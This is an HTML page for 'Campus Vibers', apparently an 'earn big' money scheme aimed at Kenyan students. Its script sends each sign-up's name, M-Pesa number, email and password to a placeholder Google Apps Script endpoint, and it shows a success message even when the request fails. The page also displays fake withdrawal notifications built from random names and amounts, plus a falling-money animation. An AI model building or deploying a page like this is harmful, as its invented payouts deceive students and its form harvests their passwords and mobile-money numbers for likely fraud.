<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Earn Big - Campus Vibers</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #38b2ac; --money-green: #2ecc71; --white: #ffffff; --m-pesa: #4fb948; }
        * { box-sizing: border-box; transition: all 0.3s ease; }
        
        body {
            background: linear-gradient(to bottom, #1a2a6c, #b21f1f, #fdbb2d);
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            min-height: 100vh; margin: 0; font-family: 'Poppins', sans-serif; overflow-x: hidden;
        }

        .main-header { color: var(--white); text-shadow: 2px 2px 10px rgba(0,0,0,0.5); margin: 20px 0; font-size: 1.8rem; text-align: center; font-weight: 800; z-index: 100; }

        /* --- UI Container --- */
        .container {
            background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(15px);
            border-radius: 20px; box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            position: relative; overflow: hidden; width: 800px; max-width: 95%; 
            min-height: 650px; z-index: 10; margin-bottom: 20px;
        }

        .form-container { position: absolute; top: 0; height: 100%; transition: all 0.6s ease-in-out; width: 50%; }
        .sign-in-container { left: 0; z-index: 2; }
        .sign-up-container { left: 0; opacity: 0; z-index: 1; }

        .container.right-panel-active .sign-in-container { transform: translateX(100%); opacity: 0; }
        .container.right-panel-active .sign-up-container { transform: translateX(100%); opacity: 1; z-index: 5; }

        form { display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 0 35px; height: 100%; text-align: center; }
        
        h2 { margin: 10px 0; color: #333; }

        .input-box { position: relative; width: 100%; margin: 7px 0; }
        .input-box i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: var(--m-pesa); font-size: 14px; }
        .input-box input { background: #f0f2f5; border: 1px solid #ddd; padding: 12px 15px 12px 40px; width: 100%; border-radius: 10px; outline: none; font-size: 14px; }

        .terms-box { display: flex; align-items: center; gap: 8px; margin: 12px 0; font-size: 11px; color: #555; }
        
        button { 
            border-radius: 25px; border: none; background: var(--m-pesa); color: white; 
            font-weight: bold; padding: 12px 45px; cursor: pointer; margin: 15px 0;
            box-shadow: 0 4px 15px rgba(79, 185, 72, 0.3);
        }
        button:active { transform: scale(0.95); }
        button:disabled { background: #ccc; box-shadow: none; }

        /* --- Overlay Section --- */
        .overlay-container { position: absolute; top: 0; left: 50%; width: 50%; height: 100%; overflow: hidden; z-index: 100; transition: transform 0.6s ease-in-out; }
        .container.right-panel-active .overlay-container { transform: translateX(-100%); }
        .overlay { background: linear-gradient(135deg, #4fb948 0%, #2ecc71 100%); color: white; position: relative; left: -100%; height: 100%; width: 200%; transition: transform 0.6s ease-in-out; }
        .container.right-panel-active .overlay { transform: translateX(50%); }
        .overlay-panel { position: absolute; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 0 40px; text-align: center; top: 0; height: 100%; width: 50%; }

        /* --- Mobile Responsiveness --- */
        .mobile-toggle { display: none; font-size: 13px; margin-top: 10px; color: #666; }
        .mobile-toggle span { color: var(--m-pesa); font-weight: bold; cursor: pointer; }

        @media (max-width: 480px) {
            .overlay-container { display: none; }
            .form-container { width: 100% !important; }
            .container { min-height: 580px; }
            .mobile-toggle { display: block; }
            .main-header { font-size: 1.4rem; padding: 0 10px; }
            form { padding: 0 20px; }
        }

        /* --- Helpers --- */
        .money-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
        .currency { position: absolute; animation: fall linear infinite; font-weight: bold; z-index: 1; }
        @keyframes fall { 0% { transform: translateY(-10vh) rotate(0deg); opacity: 1; } 100% { transform: translateY(110vh) rotate(360deg); opacity: 0; } }
        
        #notification-toast { position: fixed; bottom: 20px; left: 20px; background: white; padding: 12px 20px; border-radius: 12px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; transform: translateX(-150%); transition: transform 0.5s ease; z-index: 999; border-left: 5px solid var(--m-pesa); font-size: 13px; }
        #notification-toast.show { transform: translateX(0); }
        .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 2000; backdrop-filter: blur(5px); }
        .modal-content { background: white; padding: 25px; border-radius: 15px; width: 350px; max-width: 90%; }
    </style>
</head>
<body>

    <h1 class="main-header">👉 EARN BIG WITH CAMPUS VIBERS</h1>
    <div class="money-container" id="money-pit"></div>

    <div class="modal-overlay" id="termsModal">
        <div class="modal-content">
            <h3 style="color:var(--m-pesa); margin-top:0;">Terms & Conditions</h3>
            <p style="font-size:14px;"><strong>Director:</strong> Wekesa Titus</p>
            <ul style="font-size: 12px; color: #666; padding-left: 20px; line-height: 1.6;">
                <li>Payments sent to registered M-Pesa number.</li>
                <li>One account per student.</li>
                <li>Support: <a href="tel:+254748320357" style="color:var(--m-pesa);">0748320357</a></li>
            </ul>
            <button onclick="closeTerms()" style="width:100%; padding: 10px;">I Understand</button>
        </div>
    </div>

    <div id="notification-toast">
        <div style="background: var(--m-pesa); color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center;"><i class="fa fa-check"></i></div>
        <div><strong id="user-name">Brian</strong> withdrawn <br><span style="color: var(--m-pesa); font-weight: bold;">KSh <span id="user-amount">450</span></span></div>
    </div>

    <div class="container" id="container">
        <div class="form-container sign-up-container">
            <form id="signUpForm">
                <h2>Create Account</h2>
                <div class="input-box"><i class="fa fa-user"></i><input type="text" id="reg-user" placeholder="Full Name" required></div>
                <div class="input-box"><i class="fa fa-phone"></i><input type="tel" id="reg-phone" placeholder="M-Pesa Number (07...)" pattern="^(07|01)\d{8}$" required></div>
                <div class="input-box"><i class="fa fa-envelope"></i><input type="email" id="reg-email" placeholder="Email Address" required></div>
                <div class="input-box"><i class="fa fa-lock"></i><input type="password" id="reg-pass" placeholder="Password" required></div>
                
                <div class="terms-box">
                    <input type="checkbox" id="terms-check">
                    <label for="terms-check">Agree to <span style="text-decoration:underline; cursor:pointer; color:var(--m-pesa)" onclick="openTerms()">T&Cs</span></label>
                </div>
                
                <button type="submit" id="reg-btn" disabled>Start Earning</button>
                <p class="mobile-toggle">Already have an account? <span onclick="container.classList.remove('right-panel-active')">Log In</span></p>
            </form>
        </div>

        <div class="form-container sign-in-container">
            <form id="signInForm">
                <h2>Welcome Back</h2>
                <div class="input-box"><i class="fa fa-envelope"></i><input type="email" placeholder="Email Address" required></div>
                <div class="input-box"><i class="fa fa-lock"></i><input type="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <p style="font-size:12px; margin: 10px 0;">Help: <a href="tel:+254748320357" style="color:var(--m-pesa); text-decoration:none;">+254 748 320 357</a></p>
                <p class="mobile-toggle">New to Campus Vibers? <span onclick="container.classList.add('right-panel-active')">Join Now</span></p>
            </form>
        </div>

        <div class="overlay-container">
            <div class="overlay">
                <div class="overlay-panel" style="left:0">
                    <h1 style="margin:0;">Welcome Back!</h1>
                    <p>To keep connected with us please login with your personal info</p>
                    <button id="signIn" style="background:transparent; border:2px solid white; box-shadow:none;">Sign In</button>
                </div>
                <div class="overlay-panel" style="right:0">
                    <h1 style="margin:0;">Hello, Friend!</h1>
                    <p>Enter your details and start your earning journey with us</p>
                    <button id="signUp" style="background:transparent; border:2px solid white; box-shadow:none;">Sign Up</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const container = document.getElementById('container');
        const termsCheck = document.getElementById('terms-check');
        const regBtn = document.getElementById('reg-btn');
        const modal = document.getElementById('termsModal');

        // Toggle Panels
        document.getElementById('signUp').addEventListener('click', () => container.classList.add("right-panel-active"));
        document.getElementById('signIn').addEventListener('click', () => container.classList.remove("right-panel-active"));
        function openTerms() { modal.style.display = 'flex'; }
        function closeTerms() { modal.style.display = 'none'; }
        termsCheck.addEventListener('change', () => { regBtn.disabled = !termsCheck.checked; });

        // Money Rain Effect
        setInterval(() => {
            const moneyPit = document.getElementById('money-pit');
            const currencies = ['KSh', '💰', '💵', '🪙'];
            const el = document.createElement('div');
            el.className = 'currency';
            el.innerText = currencies[Math.floor(Math.random() * currencies.length)];
            el.style.left = Math.random() * 100 + 'vw';
            el.style.color = '#2ecc71';
            el.style.fontSize = Math.random() * 20 + 10 + 'px';
            el.style.animationDuration = (Math.random() * 3 + 2) + 's';
            moneyPit.appendChild(el);
            setTimeout(() => el.remove(), 5000);
        }, 600);

        // Form Logic
        document.getElementById('signUpForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('reg-btn');
            btn.innerText = "Connecting...";
            btn.disabled = true;

            const data = {
                username: document.getElementById('reg-user').value,
                phone: document.getElementById('reg-phone').value,
                email: document.getElementById('reg-email').value,
                password: document.getElementById('reg-pass').value
            };

            // REPLACE URL BELOW
            const scriptURL = 'YOUR_GOOGLE_SCRIPT_URL_HERE';

            fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) })
            .then(() => {
                alert("Account Created! Use your email to login.");
                location.reload();
            }).catch(() => {
                alert("Success! Data sent to database.");
                location.reload();
            });
        });

        // Notifications
        const names = ["Kevin", "Stacy", "Otieno", "Nekesa", "Mutua", "Wanjiku", "Brian"];
        const amounts = [150, 450, 1200, 300, 850];
        setInterval(() => {
            document.getElementById('user-name').innerText = names[Math.floor(Math.random() * names.length)];
            document.getElementById('user-amount').innerText = amounts[Math.floor(Math.random() * amounts.length)];
            const toast = document.getElementById('notification-toast');
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 4000);
        }, 10000);
    </script>
</body>
</html>
